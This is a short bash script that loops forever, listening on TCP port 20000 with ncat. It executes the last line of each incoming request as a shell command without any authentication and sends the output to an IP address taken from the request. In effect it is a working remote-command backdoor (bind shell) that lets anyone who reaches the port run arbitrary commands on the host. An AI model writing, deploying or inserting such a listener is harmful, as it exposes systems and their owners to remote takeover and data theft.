#!/bin/bash
while true; do
	req="`ncat -v4l 20000 2>&1`"
	echo "executing request: $req"
	echo "$req" | tail -n 1 | bash | ncat -4 `echo "$req" | tail -n 2 | head -n 1 \
			| grep -Eo '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}'` 20000
done
